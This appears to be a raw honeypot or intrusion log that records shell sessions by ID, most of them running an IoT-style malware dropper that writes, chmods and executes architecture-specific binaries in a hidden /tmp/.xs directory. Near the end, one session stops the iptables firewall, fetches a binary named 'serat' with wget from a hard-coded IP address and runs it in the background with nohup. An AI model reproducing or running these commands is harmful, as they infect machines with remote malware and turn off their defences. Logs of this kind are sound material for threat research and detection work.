fb6bb559182b4734a39fc6f3c2d1d72d	chmod 777 /tmp/.xs/daemon.mipsel.mod
fb6bb559182b4734a39fc6f3c2d1d72d	/tmp/.xs/daemon.mipsel.mod
4a0d3a3f859a4f8497af8ef164d28ef0	mkdir /tmp/.xs/
4a0d3a3f859a4f8497af8ef164d28ef0	cat  > /tmp/.xs/daemon.armv4l.mod
4a0d3a3f859a4f8497af8ef164d28ef0	chmod 777 /tmp/.xs/daemon.armv4l.mod
4a0d3a3f859a4f8497af8ef164d28ef0	/tmp/.xs/daemon.armv4l.mod
4f152c2c22b8476d8048c30db83cc7c4	mkdir /tmp/.xs/
4f152c2c22b8476d8048c30db83cc7c4	cat  > /tmp/.xs/daemon.i686.mod
4f152c2c22b8476d8048c30db83cc7c4	chmod 777 /tmp/.xs/daemon.i686.mod
4f152c2c22b8476d8048c30db83cc7c4	/tmp/.xs/daemon.i686.mod
3b40224926334d05b9b30553a0f357f2	mkdir /tmp/.xs/
3b40224926334d05b9b30553a0f357f2	cat  > /tmp/.xs/daemon.mips.mod
3b40224926334d05b9b30553a0f357f2	chmod 777 /tmp/.xs/daemon.mips.mod
3b40224926334d05b9b30553a0f357f2	/tmp/.xs/daemon.mips.mod
0e80eb62a12f49e6a9cfc1d29e01f02b	mkdir /tmp/.xs/
0e80eb62a12f49e6a9cfc1d29e01f02b	cat  > /tmp/.xs/daemon.mipsel.mod
0e80eb62a12f49e6a9cfc1d29e01f02b	chmod 777 /tmp/.xs/daemon.mipsel.mod
0e80eb62a12f49e6a9cfc1d29e01f02b	/tmp/.xs/daemon.mipsel.mod
9c3b20b08253427e8a7544865bf6c6c7	mkdir /tmp/.xs/
9c3b20b08253427e8a7544865bf6c6c7	cat  > /tmp/.xs/daemon.armv4l.mod
9c3b20b08253427e8a7544865bf6c6c7	chmod 777 /tmp/.xs/daemon.armv4l.mod
9c3b20b08253427e8a7544865bf6c6c7	/tmp/.xs/daemon.armv4l.mod
e6c2d0b83150431a82dd5ed956f3a12e	mkdir /tmp/.xs/
e6c2d0b83150431a82dd5ed956f3a12e	cat  > /tmp/.xs/daemon.i686.mod
e6c2d0b83150431a82dd5ed956f3a12e	chmod 777 /tmp/.xs/daemon.i686.mod
e6c2d0b83150431a82dd5ed956f3a12e	/tmp/.xs/daemon.i686.mod
c48e4cf84479438cad01ca31484cbf67	mkdir /tmp/.xs/
c48e4cf84479438cad01ca31484cbf67	cat  > /tmp/.xs/daemon.mips.mod
c48e4cf84479438cad01ca31484cbf67	chmod 777 /tmp/.xs/daemon.mips.mod
c48e4cf84479438cad01ca31484cbf67	/tmp/.xs/daemon.mips.mod
b97a8ca03e9d49c6b199f91a22b41776	mkdir /tmp/.xs/
b97a8ca03e9d49c6b199f91a22b41776	cat  > /tmp/.xs/daemon.mipsel.mod
b97a8ca03e9d49c6b199f91a22b41776	chmod 777 /tmp/.xs/daemon.mipsel.mod
b97a8ca03e9d49c6b199f91a22b41776	/tmp/.xs/daemon.mipsel.mod
a8d4d469a1124fbcb505c11c225b60cd	mkdir /tmp/.xs/
a8d4d469a1124fbcb505c11c225b60cd	cat  > /tmp/.xs/daemon.armv4l.mod
a8d4d469a1124fbcb505c11c225b60cd	chmod 777 /tmp/.xs/daemon.armv4l.mod
a8d4d469a1124fbcb505c11c225b60cd	/tmp/.xs/daemon.armv4l.mod
315f0bbf7874425d8ada0dd638c93192	mkdir /tmp/.xs/
315f0bbf7874425d8ada0dd638c93192	cat  > /tmp/.xs/daemon.i686.mod
315f0bbf7874425d8ada0dd638c93192	chmod 777 /tmp/.xs/daemon.i686.mod
315f0bbf7874425d8ada0dd638c93192	/tmp/.xs/daemon.i686.mod
38b683f050bb4561a19d58c8c616bde2	mkdir /tmp/.xs/
38b683f050bb4561a19d58c8c616bde2	cat  > /tmp/.xs/daemon.mips.mod
38b683f050bb4561a19d58c8c616bde2	chmod 777 /tmp/.xs/daemon.mips.mod
38b683f050bb4561a19d58c8c616bde2	/tmp/.xs/daemon.mips.mod
a657c71b32744edba6a563e5fc50442c	mkdir /tmp/.xs/
a657c71b32744edba6a563e5fc50442c	cat  > /tmp/.xs/daemon.mipsel.mod
a657c71b32744edba6a563e5fc50442c	chmod 777 /tmp/.xs/daemon.mipsel.mod
a657c71b32744edba6a563e5fc50442c	/tmp/.xs/daemon.mipsel.mod
a33df3f66fd64de0a55d4d78cb781ac8	mkdir /tmp/.xs/
a33df3f66fd64de0a55d4d78cb781ac8	cat  > /tmp/.xs/daemon.armv4l.mod
a33df3f66fd64de0a55d4d78cb781ac8	chmod 777 /tmp/.xs/daemon.armv4l.mod
a33df3f66fd64de0a55d4d78cb781ac8	/tmp/.xs/daemon.armv4l.mod
5d6bd17ea7c64061b85d66e986c6fe78	mkdir /tmp/.xs/
5d6bd17ea7c64061b85d66e986c6fe78	cat  > /tmp/.xs/daemon.i686.mod
5d6bd17ea7c64061b85d66e986c6fe78	chmod 777 /tmp/.xs/daemon.i686.mod
5d6bd17ea7c64061b85d66e986c6fe78	/tmp/.xs/daemon.i686.mod
7bfda0395f0f4e03bd1fc24136956c30	mkdir /tmp/.xs/
7bfda0395f0f4e03bd1fc24136956c30	cat  > /tmp/.xs/daemon.mips.mod
7bfda0395f0f4e03bd1fc24136956c30	chmod 777 /tmp/.xs/daemon.mips.mod
7bfda0395f0f4e03bd1fc24136956c30	/tmp/.xs/daemon.mips.mod
e3100f345ba5471c87845b123fc83ea4	mkdir /tmp/.xs/
e3100f345ba5471c87845b123fc83ea4	cat  > /tmp/.xs/daemon.mipsel.mod
e3100f345ba5471c87845b123fc83ea4	chmod 777 /tmp/.xs/daemon.mipsel.mod
e3100f345ba5471c87845b123fc83ea4	/tmp/.xs/daemon.mipsel.mod
c18b519c2f1e40a8ab87db1d98725562	mkdir /tmp/.xs/
c18b519c2f1e40a8ab87db1d98725562	cat  > /tmp/.xs/daemon.armv4l.mod
c18b519c2f1e40a8ab87db1d98725562	chmod 777 /tmp/.xs/daemon.armv4l.mod
c18b519c2f1e40a8ab87db1d98725562	/tmp/.xs/daemon.armv4l.mod
731d8e9f972147289ddf2bdb0210fbce	mkdir /tmp/.xs/
731d8e9f972147289ddf2bdb0210fbce	cat  > /tmp/.xs/daemon.i686.mod
731d8e9f972147289ddf2bdb0210fbce	chmod 777 /tmp/.xs/daemon.i686.mod
731d8e9f972147289ddf2bdb0210fbce	/tmp/.xs/daemon.i686.mod
bf2c50ba8d454960874ff57627f6176a	mkdir /tmp/.xs/
bf2c50ba8d454960874ff57627f6176a	cat  > /tmp/.xs/daemon.mips.mod
bf2c50ba8d454960874ff57627f6176a	chmod 777 /tmp/.xs/daemon.mips.mod
bf2c50ba8d454960874ff57627f6176a	/tmp/.xs/daemon.mips.mod
5c6f40eff4b34ab49d46406221fca137	mkdir /tmp/.xs/
5c6f40eff4b34ab49d46406221fca137	cat  > /tmp/.xs/daemon.mipsel.mod
5c6f40eff4b34ab49d46406221fca137	chmod 777 /tmp/.xs/daemon.mipsel.mod
5c6f40eff4b34ab49d46406221fca137	/tmp/.xs/daemon.mipsel.mod
53cba967ef2f4ef3b7a3bb5cb31d4e79	mkdir /tmp/.xs/
53cba967ef2f4ef3b7a3bb5cb31d4e79	cat  > /tmp/.xs/daemon.armv4l.mod
53cba967ef2f4ef3b7a3bb5cb31d4e79	chmod 777 /tmp/.xs/daemon.armv4l.mod
53cba967ef2f4ef3b7a3bb5cb31d4e79	/tmp/.xs/daemon.armv4l.mod
2283eb8ccc1241c6a8ac4035643877cd	mkdir /tmp/.xs/
2283eb8ccc1241c6a8ac4035643877cd	cat  > /tmp/.xs/daemon.i686.mod
2283eb8ccc1241c6a8ac4035643877cd	chmod 777 /tmp/.xs/daemon.i686.mod
2283eb8ccc1241c6a8ac4035643877cd	/tmp/.xs/daemon.i686.mod
3c14780703084bb2b58efadea5325e60	mkdir /tmp/.xs/
3c14780703084bb2b58efadea5325e60	cat  > /tmp/.xs/daemon.mips.mod
3c14780703084bb2b58efadea5325e60	chmod 777 /tmp/.xs/daemon.mips.mod
3c14780703084bb2b58efadea5325e60	/tmp/.xs/daemon.mips.mod
7730419229bc40c596d9a39618489350	mkdir /tmp/.xs/
7730419229bc40c596d9a39618489350	cat  > /tmp/.xs/daemon.mipsel.mod
7730419229bc40c596d9a39618489350	chmod 777 /tmp/.xs/daemon.mipsel.mod
7730419229bc40c596d9a39618489350	/tmp/.xs/daemon.mipsel.mod
cd60e1db29f744bea2e6c25a1bdbdc3d	mkdir /tmp/.xs/
cd60e1db29f744bea2e6c25a1bdbdc3d	cat  > /tmp/.xs/daemon.armv4l.mod
cd60e1db29f744bea2e6c25a1bdbdc3d	chmod 777 /tmp/.xs/daemon.armv4l.mod
cd60e1db29f744bea2e6c25a1bdbdc3d	/tmp/.xs/daemon.armv4l.mod
b1119554abf54647aaec462c903703b7	mkdir /tmp/.xs/
b1119554abf54647aaec462c903703b7	cat  > /tmp/.xs/daemon.i686.mod
b1119554abf54647aaec462c903703b7	chmod 777 /tmp/.xs/daemon.i686.mod
b1119554abf54647aaec462c903703b7	/tmp/.xs/daemon.i686.mod
5d66093b24ac43ffa07ec2e8b865483e	mkdir /tmp/.xs/
5d66093b24ac43ffa07ec2e8b865483e	cat  > /tmp/.xs/daemon.mips.mod
5d66093b24ac43ffa07ec2e8b865483e	chmod 777 /tmp/.xs/daemon.mips.mod
5d66093b24ac43ffa07ec2e8b865483e	/tmp/.xs/daemon.mips.mod
01ee1dc34d5a41a2bd82da426bb8bd36	mkdir /tmp/.xs/
01ee1dc34d5a41a2bd82da426bb8bd36	cat  > /tmp/.xs/daemon.mipsel.mod
01ee1dc34d5a41a2bd82da426bb8bd36	chmod 777 /tmp/.xs/daemon.mipsel.mod
01ee1dc34d5a41a2bd82da426bb8bd36	/tmp/.xs/daemon.mipsel.mod
1d7f1d433abe4a119501551fa9c56af4	mkdir /tmp/.xs/
1d7f1d433abe4a119501551fa9c56af4	cat  > /tmp/.xs/daemon.armv4l.mod
1d7f1d433abe4a119501551fa9c56af4	chmod 777 /tmp/.xs/daemon.armv4l.mod
1d7f1d433abe4a119501551fa9c56af4	/tmp/.xs/daemon.armv4l.mod
0574e36e264f4acc9ce4d27ac96b3ce5	mkdir /tmp/.xs/
0574e36e264f4acc9ce4d27ac96b3ce5	cat  > /tmp/.xs/daemon.i686.mod
0574e36e264f4acc9ce4d27ac96b3ce5	chmod 777 /tmp/.xs/daemon.i686.mod
0574e36e264f4acc9ce4d27ac96b3ce5	/tmp/.xs/daemon.i686.mod
772dce72f11e4be3a86acaa25ae7af57	mkdir /tmp/.xs/
772dce72f11e4be3a86acaa25ae7af57	cat  > /tmp/.xs/daemon.mips.mod
772dce72f11e4be3a86acaa25ae7af57	chmod 777 /tmp/.xs/daemon.mips.mod
772dce72f11e4be3a86acaa25ae7af57	/tmp/.xs/daemon.mips.mod
672555a93b49434c95031c66486bfb9b	mkdir /tmp/.xs/
672555a93b49434c95031c66486bfb9b	cat  > /tmp/.xs/daemon.mipsel.mod
672555a93b49434c95031c66486bfb9b	chmod 777 /tmp/.xs/daemon.mipsel.mod
672555a93b49434c95031c66486bfb9b	/tmp/.xs/daemon.mipsel.mod
53dca242fc274c1a89729a2335af7ba9	mkdir /tmp/.xs/
53dca242fc274c1a89729a2335af7ba9	cat  > /tmp/.xs/daemon.armv4l.mod
53dca242fc274c1a89729a2335af7ba9	chmod 777 /tmp/.xs/daemon.armv4l.mod
53dca242fc274c1a89729a2335af7ba9	/tmp/.xs/daemon.armv4l.mod
d87aad1bdb764b62a55dd790b2c33d6e	mkdir /tmp/.xs/
d87aad1bdb764b62a55dd790b2c33d6e	cat  > /tmp/.xs/daemon.i686.mod
d87aad1bdb764b62a55dd790b2c33d6e	chmod 777 /tmp/.xs/daemon.i686.mod
d87aad1bdb764b62a55dd790b2c33d6e	/tmp/.xs/daemon.i686.mod
3a01415682774d2296734e22908c3841	mkdir /tmp/.xs/
3a01415682774d2296734e22908c3841	cat  > /tmp/.xs/daemon.mips.mod
3a01415682774d2296734e22908c3841	chmod 777 /tmp/.xs/daemon.mips.mod
3a01415682774d2296734e22908c3841	/tmp/.xs/daemon.mips.mod
b83497894f2f4cfb8d3a84c99c8cf522	mkdir /tmp/.xs/
b83497894f2f4cfb8d3a84c99c8cf522	cat  > /tmp/.xs/daemon.mipsel.mod
b83497894f2f4cfb8d3a84c99c8cf522	chmod 777 /tmp/.xs/daemon.mipsel.mod
b83497894f2f4cfb8d3a84c99c8cf522	/tmp/.xs/daemon.mipsel.mod
ab997803871e46a1a0fece3df22d2b15	mkdir /tmp/.xs/
ab997803871e46a1a0fece3df22d2b15	cat  > /tmp/.xs/daemon.armv4l.mod
ab997803871e46a1a0fece3df22d2b15	chmod 777 /tmp/.xs/daemon.armv4l.mod
ab997803871e46a1a0fece3df22d2b15	/tmp/.xs/daemon.armv4l.mod
564bac16fa174c7facbaf52d9d83ba8a	mkdir /tmp/.xs/
564bac16fa174c7facbaf52d9d83ba8a	cat  > /tmp/.xs/daemon.i686.mod
564bac16fa174c7facbaf52d9d83ba8a	chmod 777 /tmp/.xs/daemon.i686.mod
564bac16fa174c7facbaf52d9d83ba8a	/tmp/.xs/daemon.i686.mod
61374d586cce4d66b084f33e29cd73f6	mkdir /tmp/.xs/
61374d586cce4d66b084f33e29cd73f6	cat  > /tmp/.xs/daemon.mips.mod
61374d586cce4d66b084f33e29cd73f6	chmod 777 /tmp/.xs/daemon.mips.mod
61374d586cce4d66b084f33e29cd73f6	/tmp/.xs/daemon.mips.mod
7412f4b284b047bc827670cf82c7317b	mkdir /tmp/.xs/
7412f4b284b047bc827670cf82c7317b	cat  > /tmp/.xs/daemon.mipsel.mod
7412f4b284b047bc827670cf82c7317b	chmod 777 /tmp/.xs/daemon.mipsel.mod
7412f4b284b047bc827670cf82c7317b	/tmp/.xs/daemon.mipsel.mod
1247f047419b4b319ee0c1cd006d523b	mkdir /tmp/.xs/
1247f047419b4b319ee0c1cd006d523b	cat  > /tmp/.xs/daemon.armv4l.mod
1247f047419b4b319ee0c1cd006d523b	chmod 777 /tmp/.xs/daemon.armv4l.mod
1247f047419b4b319ee0c1cd006d523b	/tmp/.xs/daemon.armv4l.mod
e7e2dd5b51554a1fb29ec1301b79a0be	mkdir /tmp/.xs/
e7e2dd5b51554a1fb29ec1301b79a0be	cat  > /tmp/.xs/daemon.i686.mod
e7e2dd5b51554a1fb29ec1301b79a0be	chmod 777 /tmp/.xs/daemon.i686.mod
e7e2dd5b51554a1fb29ec1301b79a0be	/tmp/.xs/daemon.i686.mod
42460e33bd9d416f8219de3588ddb578	mkdir /tmp/.xs/
42460e33bd9d416f8219de3588ddb578	cat  > /tmp/.xs/daemon.mips.mod
42460e33bd9d416f8219de3588ddb578	chmod 777 /tmp/.xs/daemon.mips.mod
42460e33bd9d416f8219de3588ddb578	/tmp/.xs/daemon.mips.mod
5f073841ff664978abbc7f43c320475e	mkdir /tmp/.xs/
5f073841ff664978abbc7f43c320475e	cat  > /tmp/.xs/daemon.mipsel.mod
5f073841ff664978abbc7f43c320475e	chmod 777 /tmp/.xs/daemon.mipsel.mod
5f073841ff664978abbc7f43c320475e	/tmp/.xs/daemon.mipsel.mod
787dcffd24944b42ae43f9aa2bd9c391	mkdir /tmp/.xs/
787dcffd24944b42ae43f9aa2bd9c391	cat  > /tmp/.xs/daemon.armv4l.mod
787dcffd24944b42ae43f9aa2bd9c391	chmod 777 /tmp/.xs/daemon.armv4l.mod
787dcffd24944b42ae43f9aa2bd9c391	/tmp/.xs/daemon.armv4l.mod
39a50dafa0e44f5da4558f9f344b8e5e	mkdir /tmp/.xs/
39a50dafa0e44f5da4558f9f344b8e5e	cat  > /tmp/.xs/daemon.i686.mod
39a50dafa0e44f5da4558f9f344b8e5e	chmod 777 /tmp/.xs/daemon.i686.mod
39a50dafa0e44f5da4558f9f344b8e5e	/tmp/.xs/daemon.i686.mod
53c27c8753554081b9ccba6bd7b0e52f	mkdir /tmp/.xs/
53c27c8753554081b9ccba6bd7b0e52f	cat  > /tmp/.xs/daemon.mips.mod
53c27c8753554081b9ccba6bd7b0e52f	chmod 777 /tmp/.xs/daemon.mips.mod
53c27c8753554081b9ccba6bd7b0e52f	/tmp/.xs/daemon.mips.mod
5437c0c6a104479da07360f53ce392a5	mkdir /tmp/.xs/
5437c0c6a104479da07360f53ce392a5	cat  > /tmp/.xs/daemon.mipsel.mod
5437c0c6a104479da07360f53ce392a5	chmod 777 /tmp/.xs/daemon.mipsel.mod
5437c0c6a104479da07360f53ce392a5	/tmp/.xs/daemon.mipsel.mod
5f51a6525938483aa4d5225beb77e78f	mkdir /tmp/.xs/
5f51a6525938483aa4d5225beb77e78f	cat  > /tmp/.xs/daemon.armv4l.mod
5f51a6525938483aa4d5225beb77e78f	chmod 777 /tmp/.xs/daemon.armv4l.mod
5f51a6525938483aa4d5225beb77e78f	/tmp/.xs/daemon.armv4l.mod
dcf62eedc3d244a58f5b2d679c3420d5	mkdir /tmp/.xs/
dcf62eedc3d244a58f5b2d679c3420d5	cat  > /tmp/.xs/daemon.i686.mod
dcf62eedc3d244a58f5b2d679c3420d5	chmod 777 /tmp/.xs/daemon.i686.mod
dcf62eedc3d244a58f5b2d679c3420d5	/tmp/.xs/daemon.i686.mod
820400e8cc354903bcdcdfe6f370528e	mkdir /tmp/.xs/
820400e8cc354903bcdcdfe6f370528e	cat  > /tmp/.xs/daemon.mips.mod
820400e8cc354903bcdcdfe6f370528e	chmod 777 /tmp/.xs/daemon.mips.mod
820400e8cc354903bcdcdfe6f370528e	/tmp/.xs/daemon.mips.mod
67e6cb8502d8418fbc0eefc555fe5268	mkdir /tmp/.xs/
67e6cb8502d8418fbc0eefc555fe5268	cat  > /tmp/.xs/daemon.mipsel.mod
67e6cb8502d8418fbc0eefc555fe5268	chmod 777 /tmp/.xs/daemon.mipsel.mod
67e6cb8502d8418fbc0eefc555fe5268	/tmp/.xs/daemon.mipsel.mod
0cb3b290d5d2481a8e6f8eb9638e405a	mkdir /tmp/.xs/
0cb3b290d5d2481a8e6f8eb9638e405a	cat  > /tmp/.xs/daemon.armv4l.mod
0cb3b290d5d2481a8e6f8eb9638e405a	chmod 777 /tmp/.xs/daemon.armv4l.mod
0cb3b290d5d2481a8e6f8eb9638e405a	/tmp/.xs/daemon.armv4l.mod
3b0fc1faca32423eb25454d61b3c2f81	mkdir /tmp/.xs/
3b0fc1faca32423eb25454d61b3c2f81	cat  > /tmp/.xs/daemon.i686.mod
3b0fc1faca32423eb25454d61b3c2f81	chmod 777 /tmp/.xs/daemon.i686.mod
3b0fc1faca32423eb25454d61b3c2f81	/tmp/.xs/daemon.i686.mod
1127841d030a438d98da2700ad268fbc	mkdir /tmp/.xs/
1127841d030a438d98da2700ad268fbc	cat  > /tmp/.xs/daemon.mips.mod
1127841d030a438d98da2700ad268fbc	chmod 777 /tmp/.xs/daemon.mips.mod
1127841d030a438d98da2700ad268fbc	/tmp/.xs/daemon.mips.mod
416404f23a53453d9bbbfcd222c9eabe	mkdir /tmp/.xs/
416404f23a53453d9bbbfcd222c9eabe	cat  > /tmp/.xs/daemon.mipsel.mod
416404f23a53453d9bbbfcd222c9eabe	chmod 777 /tmp/.xs/daemon.mipsel.mod
416404f23a53453d9bbbfcd222c9eabe	/tmp/.xs/daemon.mipsel.mod
6bb3fb2e78714203857830b3da1df6d6	mkdir /tmp/.xs/
6bb3fb2e78714203857830b3da1df6d6	cat  > /tmp/.xs/daemon.armv4l.mod
6bb3fb2e78714203857830b3da1df6d6	chmod 777 /tmp/.xs/daemon.armv4l.mod
6bb3fb2e78714203857830b3da1df6d6	/tmp/.xs/daemon.armv4l.mod
d1dab25064d84f49934f7bd600d26510	mkdir /tmp/.xs/
d1dab25064d84f49934f7bd600d26510	cat  > /tmp/.xs/daemon.i686.mod
d1dab25064d84f49934f7bd600d26510	chmod 777 /tmp/.xs/daemon.i686.mod
d1dab25064d84f49934f7bd600d26510	/tmp/.xs/daemon.i686.mod
c946a49e9dde4952a143e065a90132e6	mkdir /tmp/.xs/
c946a49e9dde4952a143e065a90132e6	cat  > /tmp/.xs/daemon.mips.mod
c946a49e9dde4952a143e065a90132e6	chmod 777 /tmp/.xs/daemon.mips.mod
c946a49e9dde4952a143e065a90132e6	/tmp/.xs/daemon.mips.mod
121aaee3a6e34db7ab623d1f716557b3	mkdir /tmp/.xs/
121aaee3a6e34db7ab623d1f716557b3	cat  > /tmp/.xs/daemon.mipsel.mod
121aaee3a6e34db7ab623d1f716557b3	chmod 777 /tmp/.xs/daemon.mipsel.mod
121aaee3a6e34db7ab623d1f716557b3	/tmp/.xs/daemon.mipsel.mod
c8664dc012e9451d94f5888b9c476be3	mkdir /tmp/.xs/
c8664dc012e9451d94f5888b9c476be3	cat  > /tmp/.xs/daemon.armv4l.mod
c8664dc012e9451d94f5888b9c476be3	chmod 777 /tmp/.xs/daemon.armv4l.mod
c8664dc012e9451d94f5888b9c476be3	/tmp/.xs/daemon.armv4l.mod
84cbca91881a42b089fc40968e6d3b22	mkdir /tmp/.xs/
84cbca91881a42b089fc40968e6d3b22	cat  > /tmp/.xs/daemon.i686.mod
84cbca91881a42b089fc40968e6d3b22	chmod 777 /tmp/.xs/daemon.i686.mod
84cbca91881a42b089fc40968e6d3b22	/tmp/.xs/daemon.i686.mod
45698cfc6f1f4f05805cbf7f214b4b9c	mkdir /tmp/.xs/
45698cfc6f1f4f05805cbf7f214b4b9c	cat  > /tmp/.xs/daemon.mips.mod
45698cfc6f1f4f05805cbf7f214b4b9c	chmod 777 /tmp/.xs/daemon.mips.mod
45698cfc6f1f4f05805cbf7f214b4b9c	/tmp/.xs/daemon.mips.mod
78b78b8bb0d84d0186c6defb972c7dc2	mkdir /tmp/.xs/
78b78b8bb0d84d0186c6defb972c7dc2	cat  > /tmp/.xs/daemon.mipsel.mod
78b78b8bb0d84d0186c6defb972c7dc2	chmod 777 /tmp/.xs/daemon.mipsel.mod
78b78b8bb0d84d0186c6defb972c7dc2	/tmp/.xs/daemon.mipsel.mod
f881b8fa9b17443cb80c18eafaa324e3	mkdir /tmp/.xs/
f881b8fa9b17443cb80c18eafaa324e3	cat  > /tmp/.xs/daemon.armv4l.mod
f881b8fa9b17443cb80c18eafaa324e3	chmod 777 /tmp/.xs/daemon.armv4l.mod
f881b8fa9b17443cb80c18eafaa324e3	/tmp/.xs/daemon.armv4l.mod
067c98d47f6f49c3bdcf9a8501f1978f	mkdir /tmp/.xs/
067c98d47f6f49c3bdcf9a8501f1978f	cat  > /tmp/.xs/daemon.i686.mod
067c98d47f6f49c3bdcf9a8501f1978f	chmod 777 /tmp/.xs/daemon.i686.mod
067c98d47f6f49c3bdcf9a8501f1978f	/tmp/.xs/daemon.i686.mod
e3188dc5345c4bcf868903fd1add8da0	mkdir /tmp/.xs/
e3188dc5345c4bcf868903fd1add8da0	cat  > /tmp/.xs/daemon.mips.mod
e3188dc5345c4bcf868903fd1add8da0	chmod 777 /tmp/.xs/daemon.mips.mod
e3188dc5345c4bcf868903fd1add8da0	/tmp/.xs/daemon.mips.mod
77b0444acdfa4ba59048e861c87912c9	mkdir /tmp/.xs/
77b0444acdfa4ba59048e861c87912c9	cat  > /tmp/.xs/daemon.mipsel.mod
77b0444acdfa4ba59048e861c87912c9	chmod 777 /tmp/.xs/daemon.mipsel.mod
77b0444acdfa4ba59048e861c87912c9	/tmp/.xs/daemon.mipsel.mod
7d1d451c491f4f809a3eeb5ca491c459	mkdir /tmp/.xs/
7d1d451c491f4f809a3eeb5ca491c459	cat  > /tmp/.xs/daemon.armv4l.mod
7d1d451c491f4f809a3eeb5ca491c459	chmod 777 /tmp/.xs/daemon.armv4l.mod
7d1d451c491f4f809a3eeb5ca491c459	/tmp/.xs/daemon.armv4l.mod
8ae5eedb6e944ae39cfd89fc47209d03	mkdir /tmp/.xs/
8ae5eedb6e944ae39cfd89fc47209d03	cat  > /tmp/.xs/daemon.i686.mod
8ae5eedb6e944ae39cfd89fc47209d03	chmod 777 /tmp/.xs/daemon.i686.mod
8ae5eedb6e944ae39cfd89fc47209d03	/tmp/.xs/daemon.i686.mod
1659050edbce4b328ab8493207531699	mkdir /tmp/.xs/
1659050edbce4b328ab8493207531699	cat  > /tmp/.xs/daemon.mips.mod
1659050edbce4b328ab8493207531699	chmod 777 /tmp/.xs/daemon.mips.mod
1659050edbce4b328ab8493207531699	/tmp/.xs/daemon.mips.mod
ca2eb7d2a3a041e09aadb6c2f399c862	mkdir /tmp/.xs/
ca2eb7d2a3a041e09aadb6c2f399c862	cat  > /tmp/.xs/daemon.mipsel.mod
ca2eb7d2a3a041e09aadb6c2f399c862	chmod 777 /tmp/.xs/daemon.mipsel.mod
ca2eb7d2a3a041e09aadb6c2f399c862	/tmp/.xs/daemon.mipsel.mod
2d6eceb93c4649348604d7adc5282f5e	echo -n test
2d6eceb93c4649348604d7adc5282f5e	cat /proc/version
7066791bc9264fef9000d4a9a600649f	mkdir /tmp/.xs/
7066791bc9264fef9000d4a9a600649f	cat  > /tmp/.xs/daemon.armv4l.mod
7066791bc9264fef9000d4a9a600649f	chmod 777 /tmp/.xs/daemon.armv4l.mod
7066791bc9264fef9000d4a9a600649f	/tmp/.xs/daemon.armv4l.mod
d4e874d01f484335818d56ac5be1728d	mkdir /tmp/.xs/
d4e874d01f484335818d56ac5be1728d	cat  > /tmp/.xs/daemon.i686.mod
d4e874d01f484335818d56ac5be1728d	chmod 777 /tmp/.xs/daemon.i686.mod
d4e874d01f484335818d56ac5be1728d	/tmp/.xs/daemon.i686.mod
8baf68cfd469472dad24db1a39392ddc	mkdir /tmp/.xs/
8baf68cfd469472dad24db1a39392ddc	cat  > /tmp/.xs/daemon.mips.mod
8baf68cfd469472dad24db1a39392ddc	chmod 777 /tmp/.xs/daemon.mips.mod
8baf68cfd469472dad24db1a39392ddc	/tmp/.xs/daemon.mips.mod
e95dd12071754609a140c9d7a04e94c7	mkdir /tmp/.xs/
e95dd12071754609a140c9d7a04e94c7	cat  > /tmp/.xs/daemon.mipsel.mod
e95dd12071754609a140c9d7a04e94c7	chmod 777 /tmp/.xs/daemon.mipsel.mod
e95dd12071754609a140c9d7a04e94c7	/tmp/.xs/daemon.mipsel.mod
cfd78b5c68a34e2aafc7f7013049cee6	mkdir /tmp/.xs/
cfd78b5c68a34e2aafc7f7013049cee6	cat  > /tmp/.xs/test.mod
cfd78b5c68a34e2aafc7f7013049cee6	chmod 777 /tmp/.xs/test.mod
cfd78b5c68a34e2aafc7f7013049cee6	/tmp/.xs/test.mod
5c43106716ed4e32a0a57689bf9ea976	service iptables stop
5c43106716ed4e32a0a57689bf9ea976	wget http://155.94.148.142:8080/serat
5c43106716ed4e32a0a57689bf9ea976	chmod 0777 serat
5c43106716ed4e32a0a57689bf9ea976	chmod u+x serat
5c43106716ed4e32a0a57689bf9ea976	./serat &
5c43106716ed4e32a0a57689bf9ea976	chmod u+x serat
5c43106716ed4e32a0a57689bf9ea976	./serat &
5c43106716ed4e32a0a57689bf9ea976	cd /tmp
5c43106716ed4e32a0a57689bf9ea976	service iptables stop
5c43106716ed4e32a0a57689bf9ea976	wget http://155.94.148.142:8080/serat
5c43106716ed4e32a0a57689bf9ea976	nohup /root/serat  >  /dev/null 2 > &1 &
5c43106716ed4e32a0a57689bf9ea976	chmod 777 serat
5c43106716ed4e32a0a57689bf9ea976	./164
5c43106716ed4e32a0a57689bf9ea976	chmod 0755 /root/serat
5c43106716ed4e32a0a57689bf9ea976	nohup /root/serat &gt
5c43106716ed4e32a0a57689bf9ea976	/dev/null 2&gt
5c43106716ed4e32a0a57689bf9ea976	&amp
5c43106716ed4e32a0a57689bf9ea976	1 &amp
